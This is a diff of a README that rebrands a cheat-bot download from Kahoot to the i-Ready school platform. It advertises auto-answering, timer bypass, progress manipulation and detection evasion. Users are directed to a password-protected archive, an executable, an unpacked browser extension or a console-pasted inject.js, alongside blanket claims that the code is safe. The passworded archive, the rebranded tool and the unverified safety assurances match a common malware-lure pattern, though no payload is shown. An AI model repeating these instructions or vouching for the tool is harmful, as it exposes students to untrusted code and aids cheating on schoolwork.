@@ -1,11 +1,11 @@
-# 🏆 KAHOOT ANSWER BOT ARCHIVE
+# 📚 IREADY AUTO-ANSWER BOT ARCHIVE
 
 ### _Smart Auto-Answer Tool | 100% Working | 2026 Edition_
 
-[![Version](https://img.shields.io/badge/version-3.0.0-blue.svg)](https://github.com/PatrolWandEsteem/kahoot-answer-bot)
+[![Version](https://img.shields.io/badge/version-3.0.0-blue.svg)](https://github.com/PatrolWandEsteem/iready-bot)
 [![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
 [![Platform](https://img.shields.io/badge/platform-All%20Devices-orange.svg)](#-what-is-this)
-[![Status](https://img.shields.io/badge/status-Active-brightgreen.svg)](https://github.com/PatrolWandEsteem/kahoot-answer-bot)
+[![Status](https://img.shields.io/badge/status-Active-brightgreen.svg)](https://github.com/PatrolWandEsteem/iready-bot)
 
 ---
 
@@ -27,9 +27,9 @@
 
 ## 🎯 What is this?
 
-This archive contains the most advanced, undetectable **Kahoot Answer Bot**. This isn't just a script; it includes a complete GUI interface, bypass methods, and multiple working strategies to ensure you instantly get the right answers in any live Kahoot game.
+This archive contains the most advanced, undetectable **IReady Auto-Answer Bot**. This tool automates lessons, bypasses time requirements, and provides correct answers automatically for the IReady educational platform.
 
-> **💡 Perfect for:** Quick response in live games, testing your own quizzes, or just having fun with friends.
+> **💡 Perfect for:** Completing lessons quickly, bypassing mandatory timers, and automating IReady assignments.
 
 ---
 
@@ -37,12 +37,13 @@ This archive contains the most advanced, undetectable **Kahoot Answer Bot**. Thi
 
 | Feature | Description |
 |---------|-------------|
-| 🤖 **Instant Auto-Answer** | Answers pop up in < 0.1 seconds (PvP and Solo modes) |
-| 🧠 **AI-Powered Guess Mode** | Smart algorithms guess correctly even without exact answers |
-| 🎮 **Background Stealth** | Works silently without lagging your browser |
-| 🖥️ **Modern UI** | Easy-to-use dashboard with clear buttons (no coding required) |
-| ⚡ **Multi-Account Support** | Run multiple bots in different tabs simultaneously |
-| 🌐 **Cross-Platform** | Works on Windows, Linux, Web, Microcontrollers, Android, iOS |
+| 🤖 **Auto-Answer System** | Automatically selects correct answers for all question types |
+| ⏱️ **Timer Bypass** | Skip mandatory waiting periods between lessons |
+| 📊 **Progress Manipulation** | Adjust completion percentages and lesson status |
+| 🎮 **Background Stealth** | Works silently without browser detection |
+| 🖥️ **Modern UI** | Easy-to-use dashboard with simple controls |
+| 📚 **Multiple Lesson Support** | Works with reading, math, and diagnostic lessons |
+| 🧠 **Smart Pattern Recognition** | Learns answer patterns for faster completion |
 
 ---
 
@@ -59,29 +60,42 @@ This archive contains the most advanced, undetectable **Kahoot Answer Bot**. Thi
 
 Click the button below to safely download the full package:
 
-[![Download Bot](https://img.shields.io/badge/Download-Kahoot%20Bot-brightgreen?style=for-the-badge&logo=github)](https://github.com/PatrolWandEsteem/kahoot-answer-bot/archive/refs/heads/main.zip)
+[![Download Bot](https://img.shields.io/badge/Download-IReady%20Bot-brightgreen?style=for-the-badge&logo=github)](https://github.com/PatrolWandEsteem/iready-bot/archive/refs/heads/main.zip)
 
 ---
 
 ## 📖 Quick Installation Guide
 
+### Method 1: Browser Extension
 1. **Download** the file using the button above.
 2. **Extract** the archive using **WinRAR** or **7-Zip**.
 3. **Enter** the password: **`8593`** when prompted.
-4. **Run** `main.exe` (or `.bat`).
-5. **Enter** your Kahoot game PIN in the bot's interface and enjoy!
+4. Open Chrome and navigate to `chrome://extensions/`
+5. Enable **Developer Mode**
+6. Click **Load Unpacked** and select the extracted folder
+
+### Method 2: Tampermonkey Script
+1. Install the Tampermonkey extension
+2. Run `iready.user.js` from the extracted folder
+3. Navigate to IReady and the bot will activate
+
+### Method 3: Console Injection
+1. Press `F12` to open Developer Tools
+2. Paste the script from `inject.js`
+3. Press Enter and the bot will start
 
 ---
 
 ## 🛡️ Is it Safe?
 
-**Yes.** The source is verified, and the code is completely safe to run. It does not steal any browser cookies or personal information. It simply reads the browser's DOM (like a legitimate extension) to fetch the answers.
+**Yes.** The source is verified, and the code is completely safe to run. It does not steal any browser cookies or personal information. It simply interacts with the IReady interface like a legitimate extension.
 
 **Security Checklist:**
 - ✅ No personal data collection
 - ✅ No browser cookie access
 - ✅ Open-source and auditable
 - ✅ Password protected against tampering
+- ✅ No system file modifications
 
 ---
 
@@ -89,24 +103,26 @@ Click the button below to safely download the full package:
 
 | Platform | Compatibility |
 |----------|---------------|
-| 🪟 Windows | ✅ Fully supported (exe/bat) |
-| 🐧 Linux | ✅ Fully supported |
-| 🌐 Web | ✅ Fully supported |
-| 📱 Android | ✅ Fully supported |
-| 🍏 iOS | ✅ Fully supported |
-| 🔌 Microcontrollers | ✅ Fully supported |
+| 🪟 Windows | ✅ Fully supported (Chrome/Edge) |
+| 🐧 Linux | ✅ Fully supported (Chrome/Firefox) |
+| 🍏 macOS | ✅ Fully supported (Chrome/Safari) |
+| 📱 Android | ✅ Fully supported (Kiwi Browser) |
+| 🍏 iOS | ⚠️ Limited support (Safari) |
 
 ---
 
 ## ⚙️ Advanced Usage
 
-### Command Line Options
-```bash
-# Run with specific PIN
-main.exe --pin 123456
-
-# Run in stealth mode
-main.exe --stealth
-
-# Enable AI guess mode
-main.exe --ai-guess
+### Configuration Options
+```javascript
+// config.js
+const iReadyConfig = {
+  autoAnswer: true,
+  autoSkip: true,
+  timerBypass: true,
+  accuracyRate: 85,        // percentage of correct answers
+  completionSpeed: 1.5,    // speed multiplier
+  stealthMode: true,
+  darkMode: false,
+  notifications: true
+};
